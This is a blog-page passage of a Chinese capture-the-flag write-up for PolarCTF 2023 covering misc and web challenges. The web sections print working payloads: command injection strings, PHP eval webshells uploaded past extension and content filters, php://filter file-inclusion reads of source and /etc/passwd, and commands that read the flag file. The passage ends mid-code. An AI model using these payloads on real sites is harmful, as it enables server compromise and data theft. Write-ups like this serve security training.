<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>PolarCTF2023冬季个人挑战赛wp(web,crypto,misc) | HvAng's Nests</title><meta name="author" content="HvAng"><meta name="copyright" content="HvAng"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="misc  misc-签到喵 经典的公众号签到题 发送宝宝想要flag(这个是base64解码得到的结果)到公众号即可   misc-A 宽宽 S 00 E U2FsdGVkX19d7TPOqeK+yL2btyx2gt4lp2ErgNwLzytzew9Wu7tcVvsR4tqWzGFi 772B6etLclejBUsSwv&#x2F;hmg&#x3D;&#x3D; 零宽字节隐写，vim查看隐写字符，然后找个在线网站得到上面的">
<meta property="og:type" content="article">
<meta property="og:title" content="PolarCTF2023冬季个人挑战赛wp(web,crypto,misc)">
<meta property="og:url" content="https://hvang10.github.io/2023/12/14/PolarCTF2023%E5%86%AC%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp-web-crypto-misc/index.html">
<meta property="og:site_name" content="HvAng&#39;s Nests">
<meta property="og:description" content="misc  misc-签到喵 经典的公众号签到题 发送宝宝想要flag(这个是base64解码得到的结果)到公众号即可   misc-A 宽宽 S 00 E U2FsdGVkX19d7TPOqeK+yL2btyx2gt4lp2ErgNwLzytzew9Wu7tcVvsR4tqWzGFi 772B6etLclejBUsSwv&#x2F;hmg&#x3D;&#x3D; 零宽字节隐写，vim查看隐写字符，然后找个在线网站得到上面的">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hvang10.github.io/img/favicon.png">
<meta property="article:published_time" content="2023-12-14T09:16:46.000Z">
<meta property="article:modified_time" content="2024-06-24T13:18:26.205Z">
<meta property="article:author" content="HvAng">
<meta property="article:tag" content="Web-learn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hvang10.github.io/img/favicon.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://hvang10.github.io/2023/12/14/PolarCTF2023%E5%86%AC%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp-web-crypto-misc/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Error',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'PolarCTF2023冬季个人挑战赛wp(web,crypto,misc)',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-06-24 21:18:26'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="HvAng's Nests" type="application/atom+xml">
</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">41</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://picx.zhimg.com/80/v2-58d0f84fe61e154aa6095a9cbe2b1b7a_1440w.jpeg')"><nav id="nav"><span id="blog-info"><a href="/" title="HvAng's Nests"><span class="site-name">HvAng's Nests</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">PolarCTF2023冬季个人挑战赛wp(web,crypto,misc)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-12-14T09:16:46.000Z" title="Created 2023-12-14 17:16:46">2023-12-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-06-24T13:18:26.205Z" title="Updated 2024-06-24 21:18:26">2024-06-24</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">3.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>15mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="PolarCTF2023冬季个人挑战赛wp(web,crypto,misc)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> misc</h1>
<h2 id="misc-签到喵"><a class="markdownIt-Anchor" href="#misc-签到喵"></a> misc-签到喵</h2>
<p>经典的公众号签到题<br />
发送<code>宝宝想要flag</code>(这个是base64解码得到的结果)到公众号即可</p>
<hr />
<h2 id="misc-a-宽宽-s-00-e"><a class="markdownIt-Anchor" href="#misc-a-宽宽-s-00-e"></a> misc-A 宽宽 S 00 E</h2>
<p><code>U2FsdGVkX19d7TPOqeK+yL2btyx2gt4lp2ErgNwLzytzew9Wu7tcVvsR4tqWzGFi 772B6etLclejBUsSwv/hmg==</code><br />
零宽字节隐写，vim查看隐写字符，然后找个在线网站得到上面的字符<br />
前段是aes字符，emm也没解出来<br />
后来在群里看见群友在聊发现秘钥是sql，好好好，原来附件给的这个sql注入是这么玩的，然后上面的密文要把空格去掉<br />
<a target="_blank" rel="noopener" href="https://stackoverflow.org.cn/aesencrypt/">https://stackoverflow.org.cn/aesencrypt/</a><br />
base64解码，加上flag{}就是答案</p>
<hr />
<h2 id="misc-机密"><a class="markdownIt-Anchor" href="#misc-机密"></a> misc-机密</h2>
<p>有个流量包，没看出什么东西，直接binwalk<br />
得到个压缩包，直接爆破，1903</p>
<hr />
<h2 id="misc-社会主义大法好"><a class="markdownIt-Anchor" href="#misc-社会主义大法好"></a> misc-社会主义大法好</h2>
<p>一开始ARCHPR识别不了这个压缩包，以为伪加密，结果binwalk分离之后也不行，估计文件格式错了，或者我电脑配置的问题，之前我就把winrar卸了，一般有概率遇到这种情况，直接掏出bandzip<br />
后来看群友聊，还得是misc神，我后面拿bandzip也能破，因为正好四位密码，图片里也有，1945，社会主义核心价值观解码<br />
<code>U2FsdGVkX18hXTEdmaHlK9Wa0JuJu4UApkMzMe69xXg8yBK0Fw5q4HtQ5+qK6BCB +WkHQDiIxks=</code><br />
删去换行符再继续下面的操作<br />
这个字符串的开头还以为是aes，其实不是，是rabbit，秘钥就拿剩下的一个数字，2014。。。。</p>
<hr />
<h2 id="misc-是uu吗"><a class="markdownIt-Anchor" href="#misc-是uu吗"></a> misc-是uu吗</h2>
<p><code>&amp;,3(S-#4V</code>题目名字包含uu，推测是uuencode，得到<code>123456</code>，应该是某个压缩包密码<br />
尝试过各种音频隐写，都不对，赛后看讲解视频才发现是steghide，其实这个123456或许能够猜到(???)<br />
<code>steghide extract -sf filename -p 123456</code><br />
得到flag.txt，再拿去uuencode解码一下<br />
<code>&gt;9FQA9WLV-S$S-S@Y-#8P,C,V-#@W-S@S,C0V.#E]</code><br />
<code>flag&#123;671378946023648778324689&#125;</code></p>
<hr />
<h2 id="misc-ez签到"><a class="markdownIt-Anchor" href="#misc-ez签到"></a> misc-EZ签到</h2>
<p>binwalk得到H1nt.zip是伪加密，得到一张小猫图片，尝试各类图片隐写，没有用<br />
最后尝试到F5-steg，先把图片拖进去，在这里<code>java Extract f1ag.jpg</code><br />
得到一个flag.txt,里面的内容很明显是zip，改后缀，要密码，binwalk一下看是不是伪加密，拿到了flag，可惜是假的。。。。。。掉坑里了<br />
出题人其实给了这个的密码<code>java Extract f1ag.jpg -p qiandao</code><br />
得到<code>nizhenbuhuiyiweizheshiqiandaoba</code>,是flag压缩包的密码<br />
得到100张图片，进行拼图，发现大小不一，借助PS批量处理，统一修改为40x40，过程可以去B站看讲解官方团队的讲解视频<br />
拼图，借助imagemagick，文件夹cmd，<code>magick montage *.jpg -tile 10x10 -geometry +0+0 flag.jpg</code>发现是无序的<br />
再借助gaps复原，<code>gaps run ./flag.jpg newflag.jpg --generations=20 --population=200 --size=40</code><br />
安装过程有点折磨，get到了拼图工具imagemagick跟自动拼图工具gaps，也算有所收获<br />
<img src="https://picx.zhimg.com/80/v2-6a1f4eada9c3b49ff731da916e4e2aa3_1440w.jpeg" alt="" /><br />
<code>R1kzRE1RWldHRTNET04yQ0dRMlRNTUpYSUUzVFNOS0dHVVpUTU9KV0c0M0VLTktHR1E0VE1SSlhJUT09PT09PQ==</code><br />
<img src="https://picx.zhimg.com/80/v2-eaba162f8ca0453ed3e786a9fee8db9c_1440w.png" alt="" /></p>
<hr />
<h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> web</h1>
<h2 id="web-cool"><a class="markdownIt-Anchor" href="#web-cool"></a> web-cool</h2>
<p>system被ban，换passthru<br />
flag被ban，利用通配符*<br />
<code>?a=passthru('cat f*');</code></p>
<hr />
<h2 id="web-phpurl"><a class="markdownIt-Anchor" href="#web-phpurl"></a> web-phpurl</h2>
<p>扫一下，发现<code>1.txt</code><br />
乱码，火狐浏览器ALT-&gt;查看-&gt;修复乱码，得到一个被加密的文件名<code>aW5kZXgucGhwcw</code>,base64解密得到<code>index.phps</code><br />
源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;xxs&quot;</span>===<span class="variable">$_GET</span>[sys]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;Not a good idea!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[sys] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[sys]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[sys] == <span class="string">&quot;xxs&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to polar LABS!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Flag: XXXXXXX &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>参数sys不能等于xxs，但是经过url编码的sys可以等于xxs，先让浏览器进行转码，%25-&gt;%,%78-&gt;x,就能实现<br />
<code>?sys=%2578xs</code><br />
(emmm,附件的内容其实就是乱码修复后的)</p>
<hr />
<h2 id="web-cookie欺骗"><a class="markdownIt-Anchor" href="#web-cookie欺骗"></a> web-cookie欺骗</h2>
<p>hackbar,将cookie值改为admin<code>user=admin</code></p>
<hr />
<h2 id="web-干正则"><a class="markdownIt-Anchor" href="#web-干正则"></a> web-干正则</h2>
<p>parse_str变量覆盖<br />
<code>?id=a[0]=www.polarctf.com&amp;cmd=127.0.0.1|cat *</code><br />
没看见“干正则”，嘿嘿<br />
一开始还找不到flag，F12即可</p>
<hr />
<h2 id="web-随机值"><a class="markdownIt-Anchor" href="#web-随机值"></a> web-随机值</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Polar1</span> = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Polar2</span> = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Night</span> = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Light</span> = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"><span class="variable">$flag</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$Polar2</span> = <span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;Polar1 === <span class="variable language_">$this</span>-&gt;Polar2) &#123;</span><br><span class="line">            <span class="variable">$Light</span> = <span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;Night === <span class="variable language_">$this</span>-&gt;Light) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Your wrong!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Index</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment"># O%3A5%3A%22Index%22%3A4%3A%7Bs%3A13%3A%22%00Index%00Polar1%22%3Bi%3A3%3Bs%3A13%3A%22%00Index%00Polar2%22%3Bi%3A3%3Bs%3A8%3A%22%00%2A%00Night%22%3Bi%3A3%3Bs%3A8%3A%22%00%2A%00Light%22%3Bi%3A3%3B%7D</span></span><br></pre></td></tr></table></figure>
<p>因为php是不能直接给private和protected的变量直接赋值的，所以rand()函数直接废掉，不起作用<br />
又或者变量引用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a-&gt;Polar1=&amp;$a-&gt;Polar2;</span><br><span class="line">$a-&gt;Night=&amp;$a-&gt;Light;</span><br></pre></td></tr></table></figure>
<hr />
<h2 id="web-upload"><a class="markdownIt-Anchor" href="#web-upload"></a> web-upload</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10000</span>,<span class="number">99999</span>).<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>明显双写绕过，将木马文件命名为a.pphphp即可，文件内容<code>&lt;?php eval($_POST['a']);</code><br />
上传文件之后，可以F12查看网络，就可以看到文件上传的位置了，再用蚁剑连接即可<br />
(补题发现，秋季那道ezupload，上传GIF文件，再抓包改php后缀，蚁剑，不过我连接的时候，警告返回数据为空？？不应该啊)</p>
<hr />
<h2 id="web-你的马呢"><a class="markdownIt-Anchor" href="#web-你的马呢"></a> web-你的马呢？</h2>
<p>经典文件上传，注意到URL，可能存在文件包含，发现可以<code>/etc/passwd</code>，先读一下源码<code>url/index.php?file=php://filter/read/convert.base64-encode/resource=upload.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$uploaddir</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line">  <span class="variable">$uploadfile</span> = <span class="variable">$uploaddir</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">  <span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//æ£æ¥æä»¶å</span></span><br><span class="line">å®¹</span><br><span class="line">  <span class="variable">$text</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$ext</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//æ£æ¥æä»¶åç¼</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph.|htaccess/i&quot;</span>, <span class="variable">$ext</span>))&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&lt;\?php/i&quot;</span>, <span class="variable">$text</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å¿å¿å¿ï¼æ³ä¼ é©¬ï¼ä¸å¯è½ï¼&lt;br&gt;&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$uploadfile</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;æ­åä½ ï¼ä¸ä¼ è·¯å¾&lt;br&gt;è·¯å¾ä¸º:&quot;</span> . <span class="variable">$uploadfile</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;æ¶æåç¼,è¯è¯.jspå¢ï¼&lt;br&gt;&quot;</span>;</span><br><span class="line">   </span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line"> &lt;title&gt;ä¸ä¼ æä»¶&lt;/title&gt;</span><br><span class="line"> &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> åä¸å«ä¸ä¼ phpèæ¬ï¼ï¼ï¼ï¼</span><br><span class="line"> &lt;form action=<span class="string">&quot;upload.php&quot;</span> method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;upfile&quot;</span> value=<span class="string">&quot;&quot;</span> /&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;æäº¤&quot;</span> /&gt;</span><br><span class="line"> &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>大致内容是，文件内容不能含&lt;?php标签，文件名后缀不能有ph.和htaccess，等<br />
上传jpg文件，利用短标签</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>post: a=system(cat /f*);</code></p>
<hr />
<h2 id="web-ezphp"><a class="markdownIt-Anchor" href="#web-ezphp"></a> web-ezphp</h2>
<p>爬虫-&gt; robots.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /file</span><br><span class="line">Disallow: /uploads</span><br><span class="line">Disallow: /uploads/images</span><br></pre></td></tr></table></figure>
<p>进入<code>uploads/upload.php</code>进行文件上传<br />
<code>/file</code>告诉我们要传参filename<br />
<code>/uploads/images</code>查看上传了那些文件<br />
上传木马文件<br />
<code>url/file/file.php?filename=../uploads/images/a.jpg</code><br />
<code>post:a=system('ls /');</code><br />
发现<code>bin dev etc home lib linuxrc media mnt proc root run sbin srv sys tmp usr var</code><br />
一般是在home或root下<br />
<code>post:a=system('ls /home');</code><br />
最终<code>post:a=system('cat /home/webuser/flag');</code></p>
<hr />
<h2 id="web-你想逃也逃不掉"><a class="markdownIt-Anchor" href="#web-你想逃也逃不掉"></a> web-你想逃也逃不掉</h2>
<p>PHP反序列化字符逃逸，题目的过滤函数使得字符减少</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    https://ytyyds.github.io/ (与本题无关)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/phtml|php3|php4|php5|aspx|gif/&#x27;</span>,<span class="string">&#x27;&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span 